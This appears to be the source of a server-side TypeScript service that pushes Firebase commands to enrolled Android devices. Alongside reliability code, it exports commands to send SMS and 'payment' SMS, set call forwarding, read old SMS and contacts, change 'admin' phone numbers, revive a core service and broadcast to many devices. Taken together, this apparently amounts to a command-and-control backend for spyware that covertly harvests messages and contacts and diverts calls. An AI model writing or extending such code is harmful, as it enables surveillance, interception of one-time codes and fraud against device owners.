// File: src/services/fcmService.ts — FINAL
import logger from "../logger/logger";
import {
  getDeviceFcmState,
  updateFcmSendMeta,
  markTokenDead,
  recordSendSuccess,
} from "./deviceService";
import { getFirebaseMessaging } from "./firebaseAdmin";

const TAG = "fcmService";

/**
 * TTL for data messages. Two reasons this must be LONG (not 60s):
 *   1. Doze mode batches deliveries into maintenance windows (~15 min apart, longer in deep Doze).
 *      A 60s message expires on Google's server before the device ever sees it.
 *   2. FCM only discovers "app uninstalled" when it ATTEMPTS delivery. A message that expires
 *      before any attempt never produces UNREGISTERED — so real uninstalls go undetected.
 * Override: FCM_TTL_MS (default 4h).
 */
let _ttl: number | null = null;
function getFcmTtlMs(): number {
  // lazy: this module is evaluated before dotenv.config() runs in this codebase
  if (_ttl === null) {
    const v = Number(process.env.FCM_TTL_MS);
    _ttl = Number.isFinite(v) && v > 0 ? v : 4 * 60 * 60 * 1000;
  }
  return _ttl;
}

type FcmDataPayload = Record<string, string>;

type SendCommandOptions = {
  requestId?: string;
  force?: boolean;
  extraData?: Record<string, string | number | boolean | null | undefined>;
};

type SendResult = { success: boolean; messageId?: string; error?: string; errorMessage?: string };

/* ═══════════════════════════════════════════
   HELPERS
   ═══════════════════════════════════════════ */

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

function toDataStringMap(
  input: Record<string, string | number | boolean | null | undefined>,
): FcmDataPayload {
  const out: FcmDataPayload = {};
  for (const [key, value] of Object.entries(input)) {
    if (value === undefined || value === null) continue;
    out[key] = String(value);
  }
  return out;
}

/**
 * Classify an FCM error.
 *   dead      → Firebase says THIS token will never work again → mark dead
 *   config    → our Firebase credentials / project are wrong → touch nothing, alert
 *   transient → network / quota / internal → touch nothing, retry later
 */
export type FcmErrorClass = "dead" | "config" | "transient";

const DEAD_CODES = new Set([
  "messaging/registration-token-not-registered",
  "messaging/invalid-registration-token",
]);
const CONFIG_CODES = new Set([
  "messaging/sender-id-mismatch",
  "messaging/third-party-auth-error",
  "messaging/mismatched-credential",
  "messaging/authentication-error",
  "messaging/invalid-credential",
  "app/invalid-credential",
]);

export function classifyFcmError(code: string, message: string): FcmErrorClass {
  const c = clean(code);
  const m = clean(message);
  if (DEAD_CODES.has(c)) return "dead";
  // Newer admin SDKs report a malformed token as invalid-argument with a token-specific message
  if (c === "messaging/invalid-argument" && /registration token/i.test(m)) return "dead";
  if (CONFIG_CODES.has(c)) return "config";
  return "transient";
}

/* ═══════════════════════════════════════════
   PAYLOAD BUILDER
   ═══════════════════════════════════════════ */

export function buildCommandPayload(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
): FcmDataPayload {
  const base = {
    command,
    deviceId,
    requestId: options.requestId || `${command}_${deviceId}_${Date.now()}`,
    force: options.force === true ? "true" : "false",
    sentAt: Date.now(),
  };

  return {
    ...toDataStringMap(base),
    ...toDataStringMap(options.extraData || {}),
  };
}

/* ═══════════════════════════════════════════
   LOW-LEVEL SEND
   ═══════════════════════════════════════════ */

export async function sendToToken(token: string, data: FcmDataPayload): Promise<SendResult> {
  const cleanToken = clean(token);
  if (!cleanToken) return { success: false, error: "missing_token" };

  try {
    const messaging = getFirebaseMessaging();
    const messageId = await messaging.send({
      token: cleanToken,
      data,
      android: {
        priority: "high",
        ttl: getFcmTtlMs(),
      },
    });
    return { success: true, messageId };
  } catch (err: any) {
    const code = clean(err?.code || err?.errorInfo?.code || "");
    const message = clean(err?.message || err?.errorInfo?.message || "");
    return {
      success: false,
      error: code || message || "send_failed",
      errorMessage: message,
    };
  }
}

/**
 * Send to a device by deviceId.
 *
 * NEVER erases the token. On a dead-class error it marks the token dead (CAS on the exact
 * token that failed). On success it records the success (which also self-heals a token
 * previously marked dead, and reverses "uninstalled").
 *
 * A token marked dead is STILL attempted here — an admin command doubles as a retry, and
 * if Firebase accepts it, the dead mark was wrong and gets cleared automatically.
 */
export async function sendToDevice(deviceId: string, data: FcmDataPayload): Promise<SendResult> {
  const state = await getDeviceFcmState(deviceId);

  if (!state.exists) {
    // same error string as before for compatibility; the log tells you it's an unknown deviceId
    logger.warn(`${TAG}: sendToDevice — device not found`, { deviceId, command: data.command });
    return { success: false, error: "missing_token" };
  }

  if (!state.token) {
    logger.warn(`${TAG}: sendToDevice skipped — no token yet`, { deviceId, command: data.command });
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastError: "missing_token",
      lastErrorAt: Date.now(),
    });
    return { success: false, error: "missing_token" };
  }

  if (state.deadAt) {
    logger.info(`${TAG}: token is marked dead — attempting anyway (acts as retry)`, {
      deviceId, command: data.command, deadCount: state.deadCount,
      deadForMin: Math.round((Date.now() - state.deadAt) / 60000),
    });
  }

  const result = await sendToToken(state.token, data);

  if (result.success) {
    logger.info(`${TAG}: push sent`, { deviceId, messageId: result.messageId, command: data.command });
    await recordSendSuccess(deviceId, state.token, result.messageId || "");
    return result;
  }

  const errorCode = result.error || "";
  const cls = classifyFcmError(errorCode, result.errorMessage || "");

  logger.warn(`${TAG}: push failed`, { deviceId, error: errorCode, class: cls, command: data.command });

  if (cls === "dead") {
    const { applied, deadCount } = await markTokenDead(deviceId, state.token, errorCode);
    if (!applied) {
      logger.info(`${TAG}: dead-class error but token already replaced by app — ignored`, { deviceId });
    } else {
      logger.warn(`${TAG}: token marked dead (kept in DB, waiting for app to sync a new one)`, {
        deviceId, deadCount,
      });
    }
  } else {
    await updateFcmSendMeta(deviceId, {
      lastAttemptAt: Date.now(),
      lastErrorAt: Date.now(),
      lastError: errorCode || "send_failed",
    });
    if (cls === "config") {
      logger.error(`${TAG}: FIREBASE CONFIG ERROR — check service account / google-services.json`, {
        deviceId, errorCode, message: result.errorMessage,
      });
    } else {
      logger.warn(`${TAG}: transient FCM error — no state change`, { deviceId, errorCode });
    }
  }

  return result;
}

/* ═══════════════════════════════════════════
   GENERIC COMMAND SENDER
   ═══════════════════════════════════════════ */

export async function sendCommandToDevice(
  deviceId: string,
  command: string,
  options: SendCommandOptions = {},
) {
  const payload = buildCommandPayload(deviceId, command, options);
  return sendToDevice(deviceId, payload);
}

/* ═══════════════════════════════════════════
   CORE SERVICE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendRestartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "restart_core", options);
}

export async function sendReviveCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "revive_core", options);
}

export async function sendStartCore(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "start_core", options);
}

export async function sendSyncToken(
  deviceId: string,
  options: Omit<SendCommandOptions, "extraData"> = {},
) {
  return sendCommandToDevice(deviceId, "sync_token", options);
}

/* ═══════════════════════════════════════════
   SMS COMMANDS
   ═══════════════════════════════════════════ */

export async function sendSmsCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `sms_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "send_sms", {
    requestId: msgId,
    extraData: {
      to: clean(to),
      message: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   CALL FORWARD COMMANDS
   ═══════════════════════════════════════════ */

export async function sendCallForwardCommand(
  deviceId: string,
  callCode: string,
  sim: string = "0",
  phoneNumber?: string,
) {
  const requestId = `cf_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "call_forward", {
    requestId,
    extraData: {
      callCode: clean(callCode),
      sim: clean(sim),
      phoneNumber: clean(phoneNumber || ""),
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   ADMIN UPDATE COMMANDS
   ═══════════════════════════════════════════ */

export async function sendAdminListUpdate(deviceId: string, admins: string[]) {
  return sendCommandToDevice(deviceId, "admins_update", {
    requestId: `admins_${deviceId}_${Date.now()}`,
    extraData: { admins: JSON.stringify(admins), timestamp: Date.now() },
  });
}

export async function sendGlobalAdminUpdate(deviceId: string, phone: string) {
  return sendCommandToDevice(deviceId, "global_admin_update", {
    requestId: `gadmin_${deviceId}_${Date.now()}`,
    extraData: { phone: clean(phone), timestamp: Date.now() },
  });
}

export async function sendDeviceAdminPhoneUpdate(deviceId: string, phone: string) {
  return sendCommandToDevice(deviceId, "device_admin_update", {
    requestId: `dadmin_${deviceId}_${Date.now()}`,
    extraData: { phone: clean(phone), timestamp: Date.now() },
  });
}

export async function sendForwardingSimUpdate(deviceId: string, value: string) {
  return sendCommandToDevice(deviceId, "forwarding_sim_update", {
    requestId: `fsim_${deviceId}_${Date.now()}`,
    extraData: { value: clean(value), timestamp: Date.now() },
  });
}

/* ═══════════════════════════════════════════
   PAYMENT COMMAND
   ═══════════════════════════════════════════ */

export async function sendPaymentCommand(
  deviceId: string,
  to: string,
  message: string,
  sim: number = 0,
  id?: string,
) {
  const msgId = id || `pay_${deviceId}_${Date.now()}`;
  return sendCommandToDevice(deviceId, "payment", {
    requestId: msgId,
    extraData: {
      smsto: clean(to),
      smsContent: clean(message),
      sim: sim,
      id: msgId,
      timestamp: Date.now(),
    },
  });
}

/* ═══════════════════════════════════════════
   PING COMMAND
   ═══════════════════════════════════════════ */

export async function sendPing(deviceId: string) {
  return sendCommandToDevice(deviceId, "ping", {
    requestId: `ping_${deviceId}_${Date.now()}`,
  });
}

/* ═══════════════════════════════════════════
   BROADCAST TO ALL DEVICES
   ═══════════════════════════════════════════ */

export async function broadcastCommandToAllDevices(
  command: string,
  options: SendCommandOptions = {},
  maxDevices: number = 1000,
): Promise<{ attempted: number; success: number; failed: number; skipped: number }> {
  const Device = (await import("../models/Device")).default;

  // Only devices with a usable token: present, not marked dead, not uninstalled.
  // (Dead tokens are retried individually by the heartbeat on their own schedule.)
  const devices = await Device.find({
    fcmToken: { $nin: ["", null, "__UNINSTALLED__"] },
    fcmTokenDeadAt: null,
    fcmStatus: { $ne: "uninstalled" },
  })
    .select("deviceId fcmToken")
    .limit(maxDevices)
    .lean();

  let attempted = 0, success = 0, failed = 0, skipped = 0;

  for (const d of devices) {
    const deviceId = clean((d as any).deviceId);
    const token    = clean((d as any).fcmToken);
    if (!deviceId || !token) { skipped++; continue; }
    attempted++;
    try {
      const result = await sendCommandToDevice(deviceId, command, options);
      if (result.success) success++; else failed++;
    } catch { failed++; }
  }

  logger.info(`${TAG}: broadcast complete`, { command, attempted, success, failed, skipped });
  return { attempted, success, failed, skipped };
}

/* ═══════════════════════════════════════════
   READ OLD SMS COMMAND
   ═══════════════════════════════════════════ */

export async function sendReadOldSmsCommand(deviceId: string, days: number = 15) {
  return sendCommandToDevice(deviceId, "read_old_sms", {
    requestId: `oldsms_${deviceId}_${Date.now()}`,
    extraData: { days, timestamp: Date.now() },
  });
}

/* ═══════════════════════════════════════════
   READ CONTACTS COMMAND
   ═══════════════════════════════════════════ */

export async function sendReadContactsCommand(deviceId: string) {
  return sendCommandToDevice(deviceId, "read_contacts", {
    requestId: `contacts_${deviceId}_${Date.now()}`,
    extraData: { timestamp: Date.now() },
  });
}

export default {
  buildCommandPayload,
  classifyFcmError,
  sendToToken,
  sendToDevice,
  sendCommandToDevice,
  sendRestartCore,
  sendReviveCore,
  sendStartCore,
  sendSyncToken,
  sendSmsCommand,
  sendCallForwardCommand,
  sendAdminListUpdate,
  sendGlobalAdminUpdate,
  sendDeviceAdminPhoneUpdate,
  sendForwardingSimUpdate,
  sendPaymentCommand,
  sendPing,
  broadcastCommandToAllDevices,
  sendReadOldSmsCommand,
  sendReadContactsCommand,
};
